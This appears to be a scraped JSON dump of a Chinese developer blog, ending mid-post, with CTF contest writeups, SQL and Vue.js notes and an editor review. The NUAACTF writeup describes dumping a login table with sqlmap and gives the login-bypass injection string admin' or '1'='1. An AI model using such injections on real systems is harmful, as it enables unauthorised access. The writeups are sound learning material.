suctf{bOQXxNoceB} Forensic-250Can you fix it?Fix the file in the rarTips:Audio文件。解压出来，发现是一个文本文件：1ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 74 14 45 50 d8 e3 f9 07 bf c7 …真是丧心病狂，把字节拆出来写到文本文件里😂 写个程序转一下。转出来就不知道干什么了… 感觉是个文件头，但是你这个文件头全被 00 刷掉了？这尼玛怎么修🌚然后线索就断了。 Re 先利其器下载一个文件。拖进 IDA，找到两段代码：123456789101112131415161718192021// ...if ( num &gt; 9 ) &#123; plaintext = 'I'; flag(&amp;plaintext);&#125;// ... signed int __cdecl flag(int *ret) &#123; ret[12] = 'a'; ret[11] = '6'; ret[10] = 'I'; ret[9] = '_'; ret[8] = 'e'; ret[7] = '5'; ret[6] = 'U'; ret[5] = '_'; ret[4] = 'n'; ret[3] = '@'; ret[2] = 'c'; return 1;&#125;然后拼起来，flag 里还差个下划线，没看代码，猜出来了：suctf{I_c@n_U5e_I6a} PE_Format文件。不懂 PE 格式，下下来以后看了半天。后来发现出题人竟然把 MZ 头和 PE 头里的 MZ 和 PE 给调过来了😂 改正后，把 MZ 头中 PE 头的位置从 0x40 改到 0x80, 程序就能跑起来了。拖到 IDA 里反编译，程序竟然是用 C艹 写的…啃代码啃代码，最后发现 flag 被按位非了，写个程序解出来：12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt; // char secret[] = \"» ¦Š ”‘ˆ ¯º ¹’ž‹À\";char secret[] = \"\\xBB\\x90\\xA0\\xA6\\x90\\x8A\\xA0\\x94\\x91\\x90\\x88\\xA0\\xAF\\xBA\\xA0\\xB9\\x90\\x8D\\x92\\x9E\\x8B\\xC0\";char v35[40]; int main()&#123; char c; int len = strlen(secret); memset(v35, 0, 30); strcpy(v35, secret); for (int i = 0; i &lt; len; i++) v35[i] = ~v35[i]; printf(\"%s\\n\", v35); return 0;&#125;得到 flag: suctf{Do_You_know_PE_Format?}. Find_correct_path文件。看源码：1234567891011121314151617181920212223242526272829303132333435363738int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax@2 char s; // [sp+Ch] [bp-2Ch]@1 char v5; // [sp+20h] [bp-18h]@1 int v6; // [sp+28h] [bp-10h]@11 int v7; // [sp+2Ch] [bp-Ch]@1 v7 = 0; memset(&amp;s, 0, 0x14u); __isoc99_scanf((const char *)&amp;unk_8048D40, &amp;v5); if ( v7 ) &#123; switch ( v7 ) &#123; case 1: choose1((int)&amp;s); break; case 2: choose2((int)&amp;s); break; case 3: choose3((int)&amp;s); break; case 4: choose4((int)&amp;s); break; &#125; v6 = strlen(&amp;s); final((int)&amp;s, v6); result = 0; &#125; else &#123; result = 1; &#125; return result;&#125;发现程序读入 v5 的值，后面却判断了 v7. 扔到 Linux 下动态调试。一开始老是报 “No such file or directory”, 后来发现没有 libc6 链接库。然后用 gdb，在 v7 赋值后下断点，改掉 v7 的值，然后让程序继续运行。最后得到 flag: suctf{Thl5_way_ls_r!8ht}.看小伙伴的 Writeup 时，发现 IDA 反编译出的源码是可以在 Linux 中编译的，他直接把源码里的 v5 改成 v7，然后编译一下就出来了。神奇😳 reverse04文件。尼玛，为啥题目是 04，文件是 03…程序里用了各种反动态调试技术，于是我就静态分析了，反正也不会。结果分析了半天，各种算地址，最后算出来的 flag 都有问题，就放弃了…据说我只跟 flag 差一个凯撒加密？噫，那天状态真是差。flag: suctf{antidebugabc}. Crypto base??MMZVM2TEI5NDOU2WHB4GEM22NRMDCTRRMZIT2PI= 全大写，根据题目判断应该是 base32. 解出来一段 base64, 再解密得到 flag: suctf{I_1ove_Su}. 凯撒大帝OK, 凯撒密码，暴力枚举一下，最后发现有两个字符串拼起来，能得到 suctf{I_am_Cathar}.然后蛋疼的地方就来了。鼓捣了一晚上，key 各种错，后来同学告诉我说，key 是 Caesar… 特么竟然是故意写错的？_(:зゝ∠)_ easyRSA文件解出来是 RSA 的公钥和加密内容。找了个 Writeup，照着做，分解质因数用 yafu 搞定，最后得到 flag: suctf{Rsa_1s_ea5y}. 普莱费尔C:prewglqkobbmxgkyzmvymlWW91IGFyZSBsdWNreQ==Playfair 密码。密钥是后面那个 base64 解出来的。然而，Playfair 的加密矩阵构造方式好像有好多种，所以找了好几个在线解密网站，最后找到 这个，把 flag 解出来了：suctf{charleswheatstone} 总结（说点闲话）这次 CTF 是个人赛，为期一周，很多题都是在工作日下班之后完成的，所以做题的时候耐心少了一点，很多题半天没做出来就放弃了（比如 Android Studio 那道题）。博客又很久没更新了，七月到十一月在实习，每天沉迷工(yu)作(le)，没有什么心思去学习、去提高。现在实习结束了，却欠了一堆作业没做。等我把作业都做完，再来更新吧。大概会写一篇 Django REST Framework 的入门指南？😳","categories":[{"name":"乱七八糟","slug":"乱七八糟","permalink":"https://blog.stdioa.com/categories/乱七八糟/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.stdioa.com/tags/CTF/"},{"name":"脑洞","slug":"脑洞","permalink":"https://blog.stdioa.com/tags/脑洞/"}]},{"title":"解决 MySQL 编码问题","slug":"django-mysql-charset-problem","date":"2016-05-09T01:40:46.000Z","updated":"2018-07-12T00:15:08.365Z","comments":true,"path":"2016/05/django-mysql-charset-problem/","link":"","permalink":"https://blog.stdioa.com/2016/05/django-mysql-charset-problem/","excerpt":"很久以前写了一个 Django 项目，数据库用的 MySQL. 很久没用，后来发现 MySQL 编码设置有问题，导致中文全部变成了问号。","text":"很久以前写了一个 Django 项目，数据库用的 MySQL. 很久没用，后来发现 MySQL 编码设置有问题，导致中文全部变成了问号。 1. 设置 MySQL 服务端默认字符集在 my.cnf 中设置默认字符集：12[mysqld]character-set-server=utf8同时，可以设置 MySQL 客户端的默认字符集：12[mysql]character-set-default=utf-8配置完成后，重启 MySQL 服务，输入 SHOW VARIABLES LIKE '%CHAR'; 检查字符集是否正确。 2. 手动设置数据库编码修改默认编码其实是没用的😂，还需要手动设置数据库编码，而数据库编码需要在建立时指定，所以…真是一个悲伤的故事😢（反正我的服务也没人用重新建立数据库：12DROP DATABASE spaste;CREATE DATABASE spaste DEFAULT CHARACTER SET utf8;重建数据库后，输入 python manager.py migrate 重新迁移数据库。 3. 参考资料Configuring the Character Set and Collation for Applications - MySQL 5.7 Reference Manualdjango 解决 mysql 数据库输入中文乱码问题 4. 后记好短的一篇文章…最近在爬 B 站用户的公开用户数据，数据库用了 MongoDB, 爬完以后好好玩一玩😳B 站基佬好多啊_(:зゝ∠)_","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.stdioa.com/categories/开发/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://blog.stdioa.com/tags/Django/"},{"name":"MySQL","slug":"MySQL","permalink":"https://blog.stdioa.com/tags/MySQL/"}]},{"title":"第一届 NUAACTF 非官方 Writeup","slug":"nuaactf-unofficial-writeup","date":"2016-04-25T04:01:04.000Z","updated":"2018-07-12T00:14:40.164Z","comments":true,"path":"2016/04/nuaactf-unofficial-writeup/","link":"","permalink":"https://blog.stdioa.com/2016/04/nuaactf-unofficial-writeup/","excerpt":"学校组织了第一届 NUAACTF，参加去玩玩，开开脑洞😂，嗯，还蛮好玩的~","text":"学校组织了第一届 NUAACTF，参加去玩玩，开开脑洞😂，嗯，还蛮好玩的~ Web 0huan’ying’lai’dao签到题，F12 即可得到 flag.Flag 藏在页面的某个 js 文件里，用 jsfuck 混淆了。 Web 1百度一下，你就知道题目貌似改过一回。改之前直接点击网页上的一个链接，跳转到某个网页，源代码里面有一段 php，具体内容不记得了，里面有一串 MD5 095a655fc809cbbdffa207717a5233f5. Google 一下找到某白菜的博客，得到原文 bnVhYWN0ZiU3Qi93ZWIyL2NlYmE2ZmJiZjBlZGU0MzI1MjY0MWNkMzM2ZTM2YTAzJTdE.看起来像 Base64，于是 decode 一下，然后 decodeURIComponents 得到 flag.后来题目改了，直接按照题目要求去百度就能直接找到某白菜的博客。 Web 2不是 bug 是 featureWeb 2 的入口点在 Web 1 的 flag 里。进去以后会跳转到某个 php, 然而某白菜又把 php 源码写进去了，思路跟上个题好像一样，也是去百度一下 MD5 得到密码，添加 GET 参数即可拿到 flag. Web 3笨笨的程序猿Web 3 的入口点在 Web 2 的 flag 里。进去以后跳转到某 php, 里面只有一个登录表单。看起来像是 SQL 注入，就用 sqlmap 扫了一下，把表 dump 出来，发现有两个账户 admin 和 user，密码都是一坨看起来什么都不像的东西，然后线索就断了。最后一个小时决定手动注入一下，然而并不怎么会 SQL 注入于是就找了几篇博客来看。注入了半天密码框均无果，最后试了一下注入用户名输入框 admin' or '1'='1，成功登录。登录以后 flag 一闪而过，本来想截屏然而懒得截了就抓了包，拿到 flag. Web 4 (未解出)你从哪里来，我的朋友。Web 3 成功登录后就跳转到 Web 4，网页写着&quot;0nly welc0me pe0ple who c0me from http://cs.nuaa.edu.cn &quot;。结合“你从哪里来”，想到了请求来源，但是我只想到了 Referer, 修改后无果。比赛结束后听说要改 Origin 和 X-Forwarded-For, 然而改了也没做出来，不知道哪里出了问题。 Rev 1曾老师的 Android 课把 apk 下载下来，用 jd-gui 打开，一阵乱翻以后发现 flag 藏在 MainActivity.class 里。 Rev 2 (未解出)奇妙的声音又看见安卓了，下下来以后一阵乱翻，没有头绪。刚才看了别人的题解，发现 flag 在资源目录里面。拿出来 res/raw/sound.wav, 用随便什么鬼打开（来之前见识过这个脑洞，专门准备的 Sonic Visualiser, 然而卡住了没有用上），发现里面有四个声道，下面两个声道像是个方波。然后一点一点数 01 数出来，得到：011011100111010101100001011000010110001101110100011001100111101101110011011010000011000001110010011101000101111101100110001100010100000101100111数格子数的眼都要花了…每一行 8 位二进制转 ASCII 码，得到 flag nuaactf{sh0rt_f1Ag, 少了一个右括号😂真是幸亏 flag 短…顺便说一句，那个音频真好听，听说是锤子手机的默认铃声😳 Rev 3不喜欢写界面的白菜哥.NET 逆向，直接拖到 IDA 里面，一阵乱翻，翻到了三段 base64 和一个摩尔斯电码表。把三段 base64 拼起来以后 decode, 得到一段摩尔斯电码 `-. …- .- .- -.-. - …-. 2D3f … .- .–. .–. -.-- -.-. .-. .- -.-. -…- .toc: true---- -. --. -.-. … … .- .-. .–. -…–.-(2D3f 是什么鬼:joy:)，解码后得到 flagNUAACTF{SAPPYCRACK1NGCSSARP}`，放到源程序里面，显示 flag 正确。然后，提交以后说 flag 不对！为什么 flag 不是 Happy Cracking CSharp? 看了半天，又交了半天的 flag，没找出问题。后来发现程序编码表里面 H 和 S 的编码一样😂 所以里面所有的 S 换成 H，源程序都会提示 flag 正确…把 H 和 S 转换，一个一个试，最后试出来 flag 是 NUAACTF{HAPPYCRACK1NGCHHARP}，也是醉人。 Pwn 1乱码！乱码！签到题。下载下来一个 txt，打开以后发现是 jsfuck，放到浏览器里运行得到 flag. Pwn 2 （未解出）回家的路CTF 竞赛考了算法…最短路…真是醉醉哒。一开始没有细想，瞎写了一个深度优先搜索，出来好多解，然而没有一个是对的，也是悲催。到最后也没有做。 Misc 1奇怪的压缩包嘛，隐写的题都蛮好玩哒😜misc1.rar 下载下来后无法打开，file 一下发现是个 PNG，改拓展名后打开，得到 flag。这个也算签到题吧。 Misc 2奇怪的图片下载 misc2.png, pngcheck 提示 additional data after IEND chunk, 看来最后一块后面还有东西，用记事本打开，发现文件最后用明文写着 key.刚刚在文件末尾发现了一个文件头 PK\\x03\\x04, 觉得应该是个 zip 文件，binwalk 一下然后用 dd 分开，得到一个 zip 文件，解压后得到 flag. 这应该是这个题的标准做法吧，只是为什么做 zip 文件的时候没有压缩🌚 Misc 3更奇怪的图片（你们这起的都是什么名字）下载下来（听说这是舰娘？），pngcheck 没有错误，卡了一会。后来用 PS 打开，把色阶拉低，发现图的左下角有个二维码，扫码得 QlpoOTFBWSZTWXhAk1kAAAtfgAAQIABgAAgAAACvIbYKIAAigNHqNGmnqFMJpoDTEO0CXcIvl9SeOAB3axLQYn4u5IpwoSDwgSay.解码后发现是乱码，不知道怎么做了，卡了很久😷 比赛的最后一个小时看见了解码后字符串开头的 BZ，突然意识到这可能是个文件头，于是将解码后的内容写入文件，file 一下发现果然是个 bz 压缩文件，解压后得到 flag. Misc 4 （未解出）讨厌的 APP觅动校园什么鬼？！ 总结比赛五个小时，解了 10 道题，前半小时解出来 5 道，后面各种卡，最后一个小时脑洞大开又解出来 3 道题😂CTF 真好玩，考到了各种姿势各种脑洞，还是蛮有意思哒~然而五个小时的比赛真的太累了…血的教训，下次题目做不出来还是要跑出去歇一会再回来做_(:зゝ∠)_","categories":[{"name":"乱七八糟","slug":"乱七八糟","permalink":"https://blog.stdioa.com/categories/乱七八糟/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"},{"name":"CTF","slug":"CTF","permalink":"https://blog.stdioa.com/tags/CTF/"},{"name":"脑洞","slug":"脑洞","permalink":"https://blog.stdioa.com/tags/脑洞/"}]},{"title":"LeetCode 数据库题目解答","slug":"leetcode-database-solutions","date":"2016-04-06T08:02:00.000Z","updated":"2018-07-15T04:32:30.066Z","comments":true,"path":"2016/04/leetcode-database-solutions/","link":"","permalink":"https://blog.stdioa.com/2016/04/leetcode-database-solutions/","excerpt":"前两天重刷了《SQL必知必会》，昨天想到了 LeetCode，于是去刷了几道数据库的题目，开了不少脑洞。","text":"前两天重刷了《SQL必知必会》，昨天想到了 LeetCode，于是去刷了几道数据库的题目，开了不少脑洞。今天把答案整理一下。喔，题库在这里。 175. Combine Two Tableshttps://leetcode.com/problems/combine-two-tables/样例中有些人的 PersonId 无法在 Address 表中找到，所以使用 LEFT JOIN.1234SELECT FirstName, LastName, City, StateFROM PersonLEFT JOIN AddressON Person.PersonId = Address.PersonId; 176. Second Highest Salaryhttps://leetcode.com/problems/second-highest-salary/UNION 查询，在结果的最后添加一个 NULL, 若不存在第二高的薪水则会选择 NULL.12345SELECT Salary FROM EmployeeUNIONSELECT NULLORDER BY Salary DESCLIMIT 1, 1; 177. Nth Highest Salaryhttps://leetcode.com/problems/nth-highest-salary/这个不知道为什么不可以用 LIMIT 1, N-1，所以用了 IF 函数。12345678910111213CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INTBEGIN RETURN ( # Write your MySQL query statement below SELECT IF(COUNT(*) &gt;= N, MIN(rank.Salary), NULL) FROM ( SELECT DISTINCT Salary FROM Employee ORDER BY Salary DESC LIMIT N ) AS rank );END 178. Rank Scoreshttps://leetcode.com/problems/rank-scores/1234567SELECT Score, ( SELECT COUNT(DISTINCT Score) FROM Scores AS c WHERE o.Score &lt;= c.Score # 统计比已选分数小的分数个数) AS RankFROM Scores AS oORDER BY Score DESC; 180. Consecutive Numbershttps://leetcode.com/problems/consecutive-numbers/暴力查询😂1234SELECT DISTINCT l1.Num AS ConsecutiveNumsFROM Logs AS l1, Logs AS l2, Logs AS l3WHERE l1.Id+1 = l2.Id AND l2.Id+1 = l3.Id AND l1.Num = l2.Num AND l2.Num = l3.Num; 181. Employees Earning More Than Their Managershttps://leetcode.com/problems/employees-earning-more-than-their-managers/选择雇员，根据 ManagerId 找到雇员上司的薪水，然后进行比较即可。1234567SELECT NameFROM EmployeeWHERE Salary &gt; ( SELECT Salary FROM Employee AS e WHERE e.id = Employee.ManagerId ); 182. Duplicate Emailshttps://leetcode.com/problems/duplicate-emails/按 Email 字段进行分类，使用 HAVING 筛选出相同 Email 数量大于 1 的项。123SELECT Email FROM PersonGROUP BY EmailHAVING COUNT(Email)&gt;1; 183. Customers Who Never Orderhttps://leetcode.com/problems/customers-who-never-order/这个也是直接查询…12345SELECT c.Name AS CustomersFROM Customers AS cWHERE (SELECT COUNT(*) FROM Orders WHERE c.id = Orders.CustomerId) = 0; 184. Department Highest Salaryhttps://leetcode.com/problems/department-highest-salary/基本上就是直接查询，注意 WHERE 语句中判别条件的位置，否则有可能 TLE😂12345678SELECT d.Name AS Department, e.Name AS Employee, e.SalaryFROM Employee AS e, Department AS dWHERE e.DepartmentId = d.Id AND e.Salary = (SELECT MAX(e2.Salary) FROM Employee AS e2 WHERE e.DepartmentId = e2.DepartmentId); 185. Department Top Three Salarieshttps://leetcode.com/problems/department-top-three-salaries/输出每个部门薪资最高的三个人。这个题里有个坑，如果两个人薪资相同，那么这两个人并列，都要输出。并且如果四个人的薪资为 3 2 2 1， 薪资为 1 的那个人排第 3 😂12345678910SELECT d.Name AS Department, e.Name AS Employee, e.SalaryFROM Employee AS e, Department AS dWHERE e.DepartmentId = d.Id AND (SELECT COUNT(DISTINCT e2.Salary) # 排序时允许并列 FROM Employee AS e2 WHERE e.DepartmentId = e2.DepartmentId AND e.Salary &lt; e2.Salary) &lt; 3 # 比该雇员工资高的人少于三个ORDER BY Department, Salary DESC; 196. Delete Duplicate Emailshttps://leetcode.com/problems/delete-duplicate-emails/MySQL 不允许在删除时依据待删除的表进行筛选 (You can’t specify target table’Person’ for update in FROM clause), 所以要绕一下。123456789101112131415# 错的！！DELETE FROM PersonWHERE Id IN (SELECT p2.Id FROM Person AS p1, Person AS p2 WHERE p1.Email = p2.Email AND p1.Id &lt; p2.Id );DELETE FROM PersonWHERE Id IN (SELECT * FROM( # 绕一下，先挑出所有满足要求的 ID 构成一个表，再从这个表中选 Id 进行删除 SELECT p2.Id FROM Person AS p1, Person AS p2 WHERE p1.Email = p2.Email AND p1.Id &lt; p2.Id) AS temp ); 197. Rising Temperaturehttps://leetcode.com/problems/rising-temperature/主要考 MySQL 的日期操作函数。1234SELECT w1.Id AS IdFROM Weather AS w1, Weather AS w2WHERE datediff(w1.Date, w2.Date) = 1 AND w1.Temperature &gt; w2.Temperature; 262. Trips and Usershttps://leetcode.com/problems/trips-and-users/太乱了，没做😥 后记昨天花了半天写完这些题，写到最后都不知道自己在写什么了😂不过还是掌握了不少的 SQL 查询技巧，比如 UNION SELECT NULL 等等。","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://blog.stdioa.com/categories/LeetCode/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://blog.stdioa.com/tags/LeetCode/"},{"name":"数据库","slug":"数据库","permalink":"https://blog.stdioa.com/tags/数据库/"},{"name":"SQL","slug":"SQL","permalink":"https://blog.stdioa.com/tags/SQL/"}]},{"title":"随手记之Vue.js","slug":"essay-vue","date":"2016-03-28T13:40:03.000Z","updated":"2018-07-12T00:15:02.653Z","comments":true,"path":"2016/03/essay-vue/","link":"","permalink":"https://blog.stdioa.com/2016/03/essay-vue/","excerpt":"之前的那门 JS 和前端课结课了，最后花了一周时间写了一个 project，使用 Vue.js 的一套工具写了一个单页面应用，先将使用到及学到的知识来整理一下。","text":"之前的那门 JS 和前端课结课了，最后花了一周时间写了一个 project，使用 Vue.js 的一套工具写了一个单页面应用，先将使用到及学到的知识来整理一下。想了想，之前自己学习 Vue.js 的时候一直在翻文档，翻到哪些让人眼前一亮的功能时就将它加进自己的项目里，并没有什么系统地进行学习，所以想到哪写到哪好了。前方高乱预警。 1. Vue.js之前用 React 用得有些不爽了所以想换换口味, 于是 用Vue.js 写了一个小应用的前端部分。它的轻量以及MVVM架构让我在两天之内爱上了它，于是决定用它代替 React 去完成 final project 的前端部分。不知道为什么，我觉得 Vue.js 比 React 更容易上手，所以很快就学会了它。想了想确实不知道该整理一些什么，因为 Vue 的官方教程写的确实很直白清楚，所以在此不再赘述，有时间的话可能会考虑写一个 Vue 的教程。 2. vue-clivue-cli 是一个 Vue.js 官方提供的脚手架工具，你可以使用它来轻松地构建出一个应用 Vue.js 的工程。官方提供 5 种模板，当然你也可以在 github 上或者本地构建自己的模板然后使用 vue-cli 生成工程。具体使用方法：生成一个工程极为简单，只需一两条命令即可。1234$ vue init webpack my-project // 使用 webpack 模板生成工程 my-project$ cd my-project$ npm install$ npm run dev然后，借助 webpack 与 vue-loader, 你可以将一个 Vue 组件的模板、核心js代码和CSS写在一个文件里，甚至还可以使用 CSS 与 HTML 的预处理器，像这样：图片来自 Vue.js 官方教程 - 构建大型应用。 3. Vue-routervue-router 是 vue 官方提供的路由模块，可以实现 SPA 中的路由操作。具体文档看这里。顺便提一句，vue-router 的中文文档已经过时了。 3.1 初始化首先使用 npm 安装 vue-router, 然后在程序入口点配置 vue-router.12345678910111213141516171819202122232425262728import Vue from 'vue'import Router from 'vue-router'import App from './components/App' // 程序的核心 Vue 应用import HomePageView from './components/HomePageView' // 导入所有的 View 组件import ItemView from './components/ItemView' Vue.use(Router) // Vue 配置var router = new Router() // 生成路由对象router.map(&#123; // 配置路由 '/': &#123; name: 'homepage', component: HomePageView &#125;, '/home': &#123; name: 'homepage', component: HomePageView &#125;, '/item/:id': &#123; // 支持动态路径 name: 'item', component: ItemView &#125;&#125; router.redirect(&#123; // 设置重定向选项 '*': '/home'&#125;) router.start(App, '[app]') // 挂载 Vue 主应用然后在 App.vue 的 template 中设置 router-view.1234567&lt;template&gt; &lt;router-view keep-alive transition=\"fade\" transition-mode=\"out-in\"&gt; &lt;/router-view&gt;&lt;/template&gt; 3.2 vue-router 的使用Vue Router 对象被嵌入到每个 vue 组件中，可以在组件中调用 this.$router 来控制 router 对象，如进行页面跳转等。此外，还可以在页面切换时在组件的 route 配置中使用路由切换钩子控制 vue-router，详情请看文档 4. VuexVuex 是一个借鉴于 Flux，但是专门为 Vue.js 所设计的状态管理方案。Flux 采用了 Action → Dispatcher → Store → View 的状态管理机制，而 Vuex 跟它差不多：Vue 组件调用 action，action dispatches mutation, mutation 改变 store 中的 state，state 改变 View. 下面是 Vuex 的数据流。 4.1 使用方法程序入口点：123import Vuex from 'vuex'Vue.use(Vuex)主应用：123456import store from '../store'export default &#123; store, // 引用store ...&#125;其它组件：123456789101112131415161718export default &#123; ..., vuex: &#123; // 定义 getter 从 store 中获取 state 并注册至应用中 getters: &#123; logged_in: function (state) &#123; return state.user.logged_in &#125; &#125;, // 定义 action, 组件可在自己的函数中调用 action 来 dispatch mutations. actions: &#123; login: (&#123; dispatch &#125;, user) =&gt; &#123; dispatch('LOGIN', user) &#125; &#125; &#125;, ...&#125;关于 store 及 mutation 的定义方式，请参考 Vuex 文档。 5. 总结 &amp; 后记跟 React 相比，个人感觉 Vue 要更容易上手，易于使用，文档也很清楚（比 Hexo 的高到不知道那里去了，前两天被 Hexo 整疯了必须要黑一下它）；Vue 的一系列工具也很易于使用，与 Vue 整合度高，可以在组件中方便地进行操作。前端课结课，准备退坑了，过几天可能会学习并整理一些后端的知识。","categories":[{"name":"Javascript","slug":"Javascript","permalink":"https://blog.stdioa.com/categories/Javascript/"}],"tags":[{"name":"前端开发","slug":"前端开发","permalink":"https://blog.stdioa.com/tags/前端开发/"},{"name":"Javascript","slug":"Javascript","permalink":"https://blog.stdioa.com/tags/Javascript/"},{"name":"node.js","slug":"node-js","permalink":"https://blog.stdioa.com/tags/node-js/"},{"name":"vue.js","slug":"vue-js","permalink":"https://blog.stdioa.com/tags/vue-js/"}]},{"title":"Atom 浅度体验感受","slug":"essay-atom-using-experience","date":"2016-03-27T02:40:03.000Z","updated":"2018-07-12T00:15:06.013Z","comments":true,"path":"2016/03/essay-atom-using-experience/","link":"","permalink":"https://blog.stdioa.com/2016/03/essay-atom-using-experience/","excerpt":"昨天看到了 Atom 官方发布了一篇 Atom Flight Manual, 看了两页觉得有些感兴趣所以下了一个体验一下。","text":"昨天看到了 Atom 官方发布了一篇 Atom Flight Manual, 看了两页觉得有些感兴趣所以下了一个体验一下。很久以前就听说了 Atom 这款编辑器，Github 宣称它是&quot;A hackable text editorfor the 21st Century&quot;, 有些感兴趣于是就搞了一个内测码下载下来来玩了玩，但是，当时 Atom 的用户体验并不好，加上可以使用的插件少之又少，就放弃了它。昨天从微博上看到了官方的 Atom Flight Manual，决定重新体验一下这款所谓“属于 21 世纪的编辑器”。当然，作为一个使用 Sublime Text 将近 2 年的用户，我肯定会将 Atom 跟 Sublime Text（下称 ST）进行比较咯。 1. 第一印象一打开Atom界面，整个 UI 还是浓浓的仿 ST 风格，快捷键都基本一样，可能是因为 ST 的 UI 确实很简洁漂亮吧。不过 ST 是收费的（无期限评估使用也是收费），而 Atom 是免费的，这点要赞一个~当然这根本无法打消暑假购买 ST 授权码的决心。 2. 启动速度Atom 的启动速度显然跟 ST 没法比。实测在装了 15 个插件以后，Atom 的启动速度要比 ST3 慢 5 倍左右。当然，它的启动速度应该会比装了一堆插件的 ST2 快一点…ST2 的启动速度貌似是历史遗留问题了。 3. 用户体验感觉 Atom 的用户体验要比上次好的多。来说一说我看好 Atom 的地方吧。Web-BasedAtom 编辑器是基于 V8，整个 Atom 编辑页面就是一个网页。不知道为什么，感觉网页对我来说更有亲切感😳，当然这也使得 Atom 更加容易修改，方便了插件的开发。Git Diff &amp; Markdown Preview 集成Atom 自带了两个插件：Git Diff 和 Markdown Preview.Git Diff 可以实时显示当前文件的 Git Diff 信息。嗯那个 Git Diff 还是蛮漂亮的~Markdown Preview 可以提供 Github Markdown 实时预览。然而作为一个可以对 Markdown 进行人肉编译的人，根本不需要这样的插件嗯😂同时，Atom 还集成了 Git 的常用功能，如当前目录所在 Git 分支。这个功能也要点个赞。Package/Theme 安装及配置这点上 Atom 做的要比 ST 好得多。Atom 可以在线查看 Package 的 README 信息，每一个 Package 也有其独立的配置页面，不必像 ST 那样直接去修改配置文件。当然，Atom 自带了一个叫做 apm 的包管理工具，这个就不错评价咯，人家只是浅度使用嘛（傲娇脸 4. Hackable 简单体验——编辑器字体修改之前用 ST 的时候为了将 Consolas 和微软雅黑结合起来，着实头疼了好久，到了 Atom 里，打开 Stylesheet 配置文件，一行代码搞定😆123atom-text-editor &#123; font-family: Consolas, \"Microsoft Yahei\", sans-serif;&#125; 5. 总结Atom 确实比以前好用了很多。我大概不会卸载它，而是把它留在电脑里，等到 ST 用腻了可以换换口味~然而尝试了 Atom 并更换主题、安装了几个实用的插件以后，我还是跑到 Sublime 那里安装了类似的插件😂配置后的 Atom:使用 Atom 前的 ST:使用 Atom 后，安装了插件Color Highlighter, GitGutter 和 SublimeGit的 ST:好吧…我把 ST 配置的像 Atom 了（摊手完。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://blog.stdioa.com/categories/随笔/"}],"tags":[{"name":"Atom","slug":"Atom","permalink":"https://blog.stdioa.com/tags/Atom/"},{"name":"Sublime Text","slug":"Sublime-Text","permalink":"https://blog.stdioa.com/tags/Sublime-Text/"},{"name":"文本编辑器","slug":"文本编辑器","permalink":"https://blog.stdioa.com/tags/文本编辑器/"},{"name":"Git","slug":"Git","permalink":"https://blog.stdioa.com/tags/Git/"}]},{"title":"Javascript学习总结","slug":"learning-javascript","date":"2016-02-24T11:31:42.000Z","updated":"2018-07-12T11:35:13.428Z","comments":true,"path":"2016/02/learning-javascript/","link":"","permalink":"https://blog.stdioa.com/2016/02/learning-javascript/","excerpt":"从开始写Javascript到现在，已经有一个月了，这一个月学了不少新姿势，随便写写，简单整理一下。","text":"从开始写Javascript到现在，已经有一个月了，这一个月学了不少新姿势，随便写写，简单整理一下。 1. Javascript这个没什么好整理的…随便写几条。1234567891011(function () &#123; var a; // 防止变量作用域提升 do_something();&#125;()); some_list.map(function (obj) &#123; this.do_something(obj); &#125;, this); // 把this传到map里面的匿名函数中，否则里面的this为undefined setInterval(function () &#123;&#125;, 1000);setTimeout(function () &#123;&#125;, 1000); 2. jQuery 2.1 选择器1234$(\"input[type=text]\") // 选择属性$(\"ul&gt;li:eq(3)\") // 选择第4个li元素$(\"ul&gt;li\").eq(3) // 选择所有\"ul&gt;li\"中的第4个元素（注意与上面那个选择器的不同）$(\"ul&gt;li:even\") // 选择所有奇数li元素（odd同理） 2.2 杂项获取表单内容时，要用$(&quot;...&quot;).val()而不是$(&quot;...&quot;).text(). 3. Node.js不知道写什么，随便写几个好玩的库：cheerio, 在服务器端解析html，跟jQuery用法差不多chalk, 输出彩色文字gulp, 流式自动化构建工具，后面细写May.2 2017 更新 3.1 Node.js 文档阅读笔记 3.1.1 console.timer计时工具。1234console.time('100-elements');for (let i = 0; i &lt; 100; i++);console.timeEnd('100-elements');// 100-elements: 0.238ms 3.1.2 BufferBuffer 在处理文件或流时可能会用到，在处理文件时，跟 Python 的 bytes 有些相似。创建 Buffer: Buffer.alloc(10) 或 Buffer.from([1, 2, 3])；长度： buf.length；切分： buf.slice([start, [end]])；字符串与 Buffer 转换：12345678&gt; b = Buffer.from(\"哦\")&lt;Buffer e5 93 a6&gt;&gt; b[0]229&gt; b.toString('utf-8')'哦'&gt; b.toString('base64')'5ZOm' 3.1.3 child_process生成子进程，执行文件：1234567891011121314const spawn = require('child_process').spawn;const ls = spawn('ls', ['-lh', '/usr']); ls.stdout.on('data', (data) =&gt; &#123; console.log(`stdout: $&#123;data&#125;`);&#125;); ls.stderr.on('data', (data) =&gt; &#123; console.log(`stderr: $&#123;data&#125;`);&#125;); ls.on('close', (code) =&gt; &#123; console.log(`child process exited with code $&#123;code&#125;`);&#125;);如果进程可以立即结束（比如 ls），或者不需要实时查看 stdout 的输出，可以使用 child_process.exec:123456789const exec = require('child_process').exec;exec('cat *.js bad_file | wc -l', (error, stdout, stderr) =&gt; &#123; if (error) &#123; console.error(`exec error: $&#123;error&#125;`); return; &#125; console.log(`stdout: $&#123;stdout&#125;`); console.log(`stderr: $&#123;stderr&#125;`);&#125;); 3.1.4 Path用于处理文件路径，跟 os.path 类似。12345678path.join('/foo', 'bar', 'baz/asdf', 